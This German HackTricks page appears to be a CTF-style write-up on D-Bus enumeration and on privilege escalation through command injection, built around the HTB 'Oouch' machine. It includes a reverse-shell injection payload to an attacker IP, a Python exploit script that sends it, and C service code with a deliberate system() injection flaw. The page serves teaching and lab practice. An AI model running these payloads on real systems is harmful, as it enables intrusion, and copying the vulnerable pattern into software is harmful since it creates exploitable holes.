# D-Bus Enumeration & Command Injection Privilege Escalation

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

## **GUI-Enumeration**

D-Bus wird als Vermittler für Interprozesskommunikation (IPC) in Ubuntu-Desktop-Umgebungen verwendet. Unter Ubuntu werden mehrere Nachrichtenbusse gleichzeitig betrieben: der Systembus, der hauptsächlich von **privilegierten Diensten genutzt wird, um systemweit relevante Dienste freizugeben**, und ein Sitzungsbus für jeden angemeldeten Benutzer, der nur für diesen spezifischen Benutzer relevante Dienste freigibt. Der Schwerpunkt liegt hier hauptsächlich auf dem Systembus, da er mit Diensten verbunden ist, die mit höheren Privilegien (z. B. root) ausgeführt werden, da unser Ziel darin besteht, Privilegien zu erhöhen. Es ist zu beachten, dass die Architektur von D-Bus einen "Router" pro Sitzungsbus verwendet, der für die Umleitung von Client-Nachrichten an die entsprechenden Dienste basierend auf der vom Client angegebenen Adresse verantwortlich ist, mit denen er kommunizieren möchte.

Dienste auf D-Bus werden durch die von ihnen freigegebenen **Objekte** und **Schnittstellen** definiert. Objekte können mit Instanzen von Klassen in herkömmlichen OOP-Sprachen verglichen werden, wobei jede Instanz durch einen **Objektpfad** eindeutig identifiziert wird. Dieser Pfad, ähnlich wie ein Dateisystempfad, identifiziert eindeutig jedes vom Dienst freigegebene Objekt. Eine wichtige Schnittstelle für Forschungszwecke ist die Schnittstelle **org.freedesktop.DBus.Introspectable**, die eine einzige Methode namens Introspect enthält. Diese Methode liefert eine XML-Repräsentation der unterstützten Methoden, Signale und Eigenschaften des Objekts, wobei hier der Fokus auf Methoden liegt und Eigenschaften und Signale ausgelassen werden.

Für die Kommunikation mit der D-Bus-Schnittstelle wurden zwei Tools verwendet: ein CLI-Tool namens **gdbus**, um Methoden, die von D-Bus in Skripten freigegeben werden, einfach aufzurufen, und [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ein auf Python basierendes GUI-Tool, das dazu dient, die auf jedem Bus verfügbaren Dienste aufzulisten und die in jedem Dienst enthaltenen Objekte anzuzeigen.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Im ersten Bild werden Dienste angezeigt, die mit dem D-Bus-Systembus registriert sind, wobei **org.debin.apt** nach Auswahl der Systembus-Schaltfläche besonders hervorgehoben ist. D-Feet fragt diesen Dienst nach Objekten ab und zeigt Schnittstellen, Methoden, Eigenschaften und Signale für ausgewählte Objekte an, wie im zweiten Bild zu sehen ist. Die Signatur jeder Methode wird ebenfalls detailliert angezeigt.

Eine bemerkenswerte Funktion ist die Anzeige der **Prozess-ID (pid)** und der **Befehlszeile** des Dienstes, die nützlich ist, um zu bestätigen, ob der Dienst mit erhöhten Rechten ausgeführt wird, was für die Relevanz der Untersuchung wichtig ist.

**D-Feet ermöglicht auch die Methodenaufruf**: Benutzer können Python-Ausdrücke als Parameter eingeben, die D-Feet in D-Bus-Typen umwandelt, bevor sie an den Dienst übergeben werden.

Beachten Sie jedoch, dass **einige Methoden eine Authentifizierung erfordern**, bevor wir sie aufrufen können. Wir werden diese Methoden ignorieren, da unser Ziel darin besteht, unsere Berechtigungen ohne Anmeldeinformationen zu erhöhen.

Beachten Sie auch, dass einige der Dienste einen anderen D-Bus-Dienst namens org.freedeskto.PolicyKit1 abfragen, ob ein Benutzer bestimmte Aktionen ausführen darf oder nicht.

## **Befehlszeilen-Enumeration**

### Liste der Dienstobjekte

Es ist möglich, geöffnete D-Bus-Schnittstellen mit folgendem Befehl aufzulisten:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Verbindungen

[Von Wikipedia:](https://de.wikipedia.org/wiki/D-Bus) Wenn ein Prozess eine Verbindung zu einem Bus herstellt, weist der Bus der Verbindung einen speziellen Busnamen zu, der als _eindeutiger Verbindungsnamen_ bezeichnet wird. Busnamen dieser Art sind unveränderlich - es ist garantiert, dass sie sich nicht ändern, solange die Verbindung besteht - und vor allem können sie während der Lebensdauer des Busses nicht wiederverwendet werden. Dies bedeutet, dass keine andere Verbindung zu diesem Bus jemals einen solchen eindeutigen Verbindungsnamen zugewiesen bekommt, auch wenn derselbe Prozess die Verbindung zum Bus schließt und eine neue erstellt. Eindeutige Verbindungsnamen sind leicht erkennbar, da sie mit dem - ansonsten verbotenen - Doppelpunkt-Zeichen beginnen.

### Service-Objektinformationen

Dann können Sie einige Informationen über die Schnittstelle mit folgendem Befehl erhalten:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Auflisten von Schnittstellen eines Service-Objekts

Sie müssen über ausreichende Berechtigungen verfügen.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspektions-Schnittstelle eines Service-Objekts

Beachten Sie, wie in diesem Beispiel die neueste Schnittstelle ausgewählt wurde, die mithilfe des `tree`-Parameters entdeckt wurde (_siehe vorherige Sektion_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Beachten Sie die Methode `.Block` des Interfaces `htb.oouch.Block` (dasjenige, an dem wir interessiert sind). Das "s" in den anderen Spalten könnte bedeuten, dass es einen String erwartet.

### Überwachungs-/Erfassungsschnittstelle

Mit ausreichenden Berechtigungen (nur `send_destination` und `receive_sender` Berechtigungen reichen nicht aus) können Sie eine D-Bus-Kommunikation überwachen.

Um eine Kommunikation zu überwachen, müssen Sie root sein. Wenn Sie immer noch Probleme haben, root zu werden, überprüfen Sie [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) und [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Wenn Sie wissen, wie man eine D-Bus-Konfigurationsdatei konfiguriert, um es nicht-root-Benutzern zu ermöglichen, die Kommunikation abzufangen, kontaktieren Sie mich bitte!
{% endhint %}

Verschiedene Möglichkeiten zur Überwachung:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Im folgenden Beispiel wird die Schnittstelle `htb.oouch.Block` überwacht und die Nachricht "**_**lalalalal**_**" wird durch Misskommunikation gesendet:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Sie können `capture` anstelle von `monitor` verwenden, um die Ergebnisse in einer pcap-Datei zu speichern.

#### Filtern des gesamten Rauschens <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Wenn auf dem Bus einfach zu viele Informationen vorhanden sind, geben Sie eine Übereinstimmungsregel wie folgt an:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Mehrere Regeln können angegeben werden. Wenn eine Nachricht _eine_ der Regeln erfüllt, wird die Nachricht gedruckt. Wie folgt:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Siehe die [D-Bus-Dokumentation](http://dbus.freedesktop.org/doc/dbus-specification.html) für weitere Informationen zur Syntax der Übereinstimmungsregeln.

### Mehr

`busctl` hat noch mehr Optionen, [**finden Sie sie hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Verwundbares Szenario**

Als Benutzer **qtc innerhalb des Hosts "oouch" von HTB** können Sie eine **unerwartete D-Bus-Konfigurationsdatei** in _/etc/dbus-1/system.d/htb.oouch.Block.conf_ finden:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Beachten Sie aus der vorherigen Konfiguration, dass **Sie als Benutzer `root` oder `www-data` sein müssen, um Informationen über diese D-BUS-Kommunikation senden und empfangen zu können**.

Als Benutzer **qtc** innerhalb des Docker-Containers **aeb4525789d8** finden Sie einige dbus-bezogene Codezeilen in der Datei _/code/oouch/routes.py_. Hier ist der interessante Code:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Wie Sie sehen können, **verbindet es sich mit einer D-Bus-Schnittstelle** und sendet die "client\_ip" an die Funktion "Block".

Auf der anderen Seite der D-Bus-Verbindung läuft ein C-kompiliertes Binärprogramm. Dieser Code **hört** in der D-Bus-Verbindung **auf die IP-Adresse und ruft über die `system`-Funktion iptables auf**, um die angegebene IP-Adresse zu blockieren.\
**Der Aufruf von `system` ist absichtlich anfällig für Befehlsinjektion**, daher wird eine Payload wie die folgende eine Reverse-Shell erstellen: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Ausnutzen

Am Ende dieser Seite finden Sie den **vollständigen C-Code der D-Bus-Anwendung**. Darin finden Sie zwischen den Zeilen 91-97, wie der `D-Bus-Objektpfad` und der `Schnittstellennamen` **registriert** werden. Diese Informationen werden benötigt, um Informationen an die D-Bus-Verbindung zu senden:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Auch in Zeile 57 finden Sie, dass **die einzige registrierte Methode** für diese D-Bus-Kommunikation `Block` heißt (_**Deshalb werden in dem folgenden Abschnitt die Payloads an das Service-Objekt `htb.oouch.Block`, die Schnittstelle `/htb/oouch/Block` und den Methodennamen `Block` gesendet**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Der folgende Python-Code sendet die Nutzlast über die D-Bus-Verbindung an die `Block`-Methode über `block_iface.Block(runme)` (_beachten Sie, dass er aus dem vorherigen Codeausschnitt extrahiert wurde_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl und dbus-send

`busctl` und `dbus-send` sind Befehlszeilenwerkzeuge, die in Linux verwendet werden, um mit dem D-Bus-Systembus zu interagieren. D-Bus ist ein Mechanismus, der die Kommunikation zwischen Anwendungen auf demselben System ermöglicht.

`busctl` ermöglicht es uns, Informationen über die auf dem System verfügbaren D-Bus-Schnittstellen abzurufen. Mit diesem Befehl können wir die verfügbaren Dienste, Objekte, Schnittstellen und Methoden anzeigen.

`dbus-send` ermöglicht es uns, D-Bus-Nachrichten an bestimmte Dienste und Objekte zu senden. Mit diesem Befehl können wir Methodenaufrufe an D-Bus-Schnittstellen durchführen.

Diese Werkzeuge können bei der Privileg Eskalation nützlich sein, da sie es uns ermöglichen, Informationen über das System zu sammeln und möglicherweise Befehle mit erhöhten Rechten auszuführen.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` ist ein Tool, das verwendet wird, um Nachrichten an den "Message Bus" zu senden.
* Message Bus - Eine Software, die von Systemen verwendet wird, um die Kommunikation zwischen Anwendungen zu erleichtern. Es ist mit einer Message Queue verwandt (Nachrichten werden in Sequenz geordnet), aber beim Message Bus werden die Nachrichten in einem Abonnementmodell gesendet und sind auch sehr schnell.
* Das Tag "-system" wird verwendet, um anzugeben, dass es sich um eine Systemnachricht handelt, nicht um eine Sitzungsnachricht (standardmäßig).
* Das Tag "--print-reply" wird verwendet, um unsere Nachricht angemessen zu drucken und alle Antworten in einem für Menschen lesbaren Format zu empfangen.
* "--dest=Dbus-Interface-Block" - Die Adresse der Dbus-Schnittstelle.
* "--string:" - Der Typ der Nachricht, den wir an die Schnittstelle senden möchten. Es gibt verschiedene Formate zum Senden von Nachrichten wie double, bytes, booleans, int, objpath. Von diesen ist der "Objektpfad" nützlich, wenn wir einen Pfad einer Datei an die Dbus-Schnittstelle senden möchten. In diesem Fall können wir eine spezielle Datei (FIFO) verwenden, um einen Befehl an die Schnittstelle im Namen einer Datei zu übergeben. "string:;" - Dies dient dazu, den Objektpfad erneut aufzurufen, in dem wir die FIFO-Reverse-Shell-Datei/den Befehl platzieren.

_Beachten Sie, dass in `htb.oouch.Block.Block` der erste Teil (`htb.oouch.Block`) auf das Service-Objekt verweist und der letzte Teil (`.Block`) auf den Methodennamen verweist._

### C-Code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Referenzen
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
